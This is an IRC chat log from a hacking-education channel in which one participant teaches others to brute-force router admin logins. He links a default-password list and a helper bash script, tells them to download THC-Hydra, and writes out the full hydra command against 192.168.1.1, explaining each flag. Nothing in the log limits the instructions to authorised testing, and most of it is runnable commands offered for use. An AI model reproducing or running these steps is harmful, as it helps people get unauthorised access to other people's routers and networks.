* EmilyPlays (d5770f7b@LulzCo-5910E532.mibbit.com) has joined #school4lulz
<hatter> its +m for the loggin Snafu
<Snafu> There are a metric fuckton of defaults out there
<Snafu> Nods
<hatter> +v people who want to take part
<nachash> Snafu: I’ve walked random girls through that over the phone.
* #school4lulz :Cannot send to channel
<Snafu> Ah
<Snafu> Um
* hatter gives voice to RandomJoe
<Snafu> Is it bad i dont know irc commands like i should =)
<Snafu> Yeah I know…fuckin noob =) Damn that snafu!
<adh> Na, just look em up.
<Snafu> But please give people voice for me
<RandomJoe> you can ./help <command> 
<t> ./mode #school4lulz +v nick
<Snafu> yeah, never had to really
<Snafu> but gotcha

* Adolf (~Adolf@9E450AF4.1F24E4E4.13FC21DA.IP) has joined #school4lulz
<Snafu> I guess all the people sending msgs want voice?
* EmilyPlays has quit (Excess Flood)
<hatter> Probably.
<hatter> lol
* Snafu gives voice to Mutiny
* Snafu gives voice to nachash
* jboy19 (jboy19@LulzCo-9C96B27D.hsd1.fl.comcast.net) has left #school4lulz
* NoahY (~AndChat@LulzCo-DCC31903.rochester.res.rr.com) has left #school4lulz
<adh> Safe assumption
* Snafu gives voice to Odysseus
* hatter gives channel half-operator status to nachash
* Snafu gives voice to xoxo
* Snafu gives voice to yawn
<nachash> Like I was saying in PM, I’ve talked girls through trying default
password combos for routers before.
<Snafu> heh, i could script this i guess
<Snafu> but anyways
<Snafu> Movin on
<Snafu> Okay
* hatter gives voice to nonbit
<Snafu> so yer on a box…..and yes
* XeroX (ident@LulzCo-BCED4F04.dip.t-dialin.net) has joined #school4lulz
<Snafu> you could try one by one
* Snafu gives voice to turnigy
<Snafu> But that’ll take a long time right?
<yawn> you should probably make a list of people that want to interact before
+m’ing the chan 
<Snafu> literally could be 5 mins before u found the right combo
<Snafu> Who wants to waste 5 minutes trying to find a password?
<RandomJoe> right
<Snafu> So lets script it
* ryan1918 has quit (Remote host closed the connection)
<Snafu> First up, grab my router.lst file
<Snafu> http://www.mediafire.com/?kqrqrf9fa2wwm3h
<Snafu> I made it with some firefox plugin off of a default router password
website
<Snafu> dont remember which
<Snafu> but for the example it works well
<Snafu> and its long as hell
<Mutiny> heh
<Mutiny> looks familiar
<Snafu> next up
<Snafu> grab this bash off pastebin
<Snafu> http://pastebin.com/4z7jUJ6D
<Snafu> chmod +x the bashfile
<Snafu> name it hydrafy
<Snafu> now do
<Snafu> ./hydrafy
* six28 has quit ()
<Snafu> Youll see some usage options come up
* ryan1918 (~ryan@7016F228.B696884D.7E210C26.IP) has joined #school4lulz
<Snafu> Usage:
<Snafu> ./hydrafy -m <run or save> <options>
<Snafu> Options:
<Snafu> -f <file to be parsed>
<Snafu> -r <brand of router to parse for>
* Co (~ircap@F86C75DA.386E4C12.6EDA1009.IP) has joined #school4lulz
<Snafu> so lets say yer playin with a linksys box
<Snafu> do
* Co (~ircap@F86C75DA.386E4C12.6EDA1009.IP) has left #school4lulz
<Snafu> ./hydrafy -m run -f router.lst -r linksys
<Snafu> that will display the username:password combos found for linksys
* d3 (~dave1@LulzCo-79749957.range62-7.btcentralplus.com) has joined
#school4lulz
* Poison (~Tesla@LulzCo-B7E0D38B.midco.net) has joined #school4lulz
<Snafu> ./hydrafy -m save -f router.lst -r linksys
<Snafu> will pop up asking you what file name to save it to
<Snafu> pick something u remember
<Snafu> now then
<Snafu> grab hydra
<Snafu> the link is……
* TransfiniteGreyWizard has quit (Ping timeout: 240 seconds)
* phed has quit (Quit: Lost terminal)
<Snafu> wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz
<Snafu> or apt-get install hydra if its in yer repo
<Snafu> now do
<Snafu> hydra 192.168.1.1 -C ./router.lst -t 1 -e ns -V -f http-get /index.asp
<Snafu> assuming that 192.168.1.1 is the router
* Poison (~Tesla@LulzCo-B7E0D38B.midco.net) has left #school4lulz
<Snafu> the ./router.lst is the name of the saved file
<Snafu> not router.lst literally or you would have overwritten the database
from pastebin
<t> you might wanna let them know what all those flags are doing
<Snafu> so try
<Snafu> hydra 192.168.1.1 -C ./linksys -t 1 -e ns -V -f http-get /index.asp
<Snafu> if you save it to linksys
<Snafu> true
<Snafu> -C is for a colonized file
<t> im a little busy or i would help out sorry
* bigtoad (~toad@B6CD1A55.610B737D.A1B61A52.IP) has joined #school4lulz
<Snafu> where usernames:passwords are ran in multiple rows
<Snafu> there are other ways to run hydra
* freedom (4a780f96@LulzCo-EFFC6835.mibbit.com) has left #school4lulz
<Snafu> I use the -C method for input of dictionaries
* TR0|\| (~TR0|\|@LulzCo-713404CA.dynamic.swissvpn.net) has joined #school4lulz
<Snafu> and if you make seperate username and password files
<Snafu> you would have to modify the bash script from pastebin i dropped
earlier
<Snafu> which would be modifying the $4 and $5 accordingly
<Snafu> thats why I use the -C method
<Snafu> its quicker
<Snafu> and linksys will always use linksys usernames
<Snafu> it wouldnt use a d-link username
<Snafu> so to speak
<Snafu> so no sense in grabbing name combos that would be ruled out by
default…Literally
<Snafu> the T is for parallel
<Snafu> the -t rather
<Snafu> -t 1 means that it will only thread once
<Snafu> -10 means it will send 10 tries at once in the same time
<Snafu> er, -t 10 rather
<Snafu> man hydra to really figure out whats going on
<Snafu> That is what will seperate you from Script Kiddies
* lake has quit (Ping timeout: 240 seconds)
<Snafu> Understanding the concepts without being truly spoonfed….and figuring
out ways to modify the commands to do it quicker better and faster
<Snafu> -e ns     additional checks, “n” for null password, “s” try login as
pass
<Snafu> Self explanatory right there
* MrOrange (~ronnyd@LulzCo-579414C7.cable.teksavvy.com) has joined #school4lulz
<Snafu> -f        exit after the first found login/password pair
<Snafu> ie
<Snafu> if you had 1000 combos
* Odysseus has quit (Remote host closed the connection)
<Snafu> and it found the answer on the 500th try
* lake (~Suicidal@7B395BC0.182D8D8F.265E0F18.IP) has joined #school4lulz
<Snafu> if you dont include -f in the syntax
<Snafu> it will keep trying, even though it already found the answer
<Snafu> so -f it!
<Snafu> hydra 192.168.1.1 -C ./router.lst -t 1 -e ns -V -f http-get /index.asp
<Snafu> http-get is the kind of request hydra is making
<Snafu> hydra is capable of making http-post and many others
<Snafu> http-get is what we want for router logins
<Snafu> last part
* Bl4kS33dsOv (~h0stm4sk@LulzCo-8A03C173.washdc.fios.verizon.net) has joined
#school4lulz
<Snafu> this can be tricky depending on the router
<Snafu> some routers show you a page, some ask for a login immediately
<Snafu> I dont have a box in front of me to experiment where im at currently so
i apologize on that or i would give examples
<Snafu> but
<Snafu> doing hydra 192.168.1.1 -C ./router.lst -t 1 -e ns -V -f http-get
/index.asp
* Billie (~Billie@LulzCo-BB91F11F.anonymous.at.anonine.com) has joined
#school4lulz
<Snafu> would tell hydra to attack 192.168.1.1, with the router.lst colonized
file, trying 1 time each try, trying blank and null passwords, being Verbal
about it, exiting after correct guess, using http-get for the method and trying
to login at http://192.168.1.1/index.asp
<Snafu> Any questions?
<xoxo> Snafu: g2g. take care. or what do you probably say? Semper fi !
<Snafu> Yeah man -=0
<xoxo> 
<Snafu> Semper Fi =)
<xoxo> you know the meaning right?
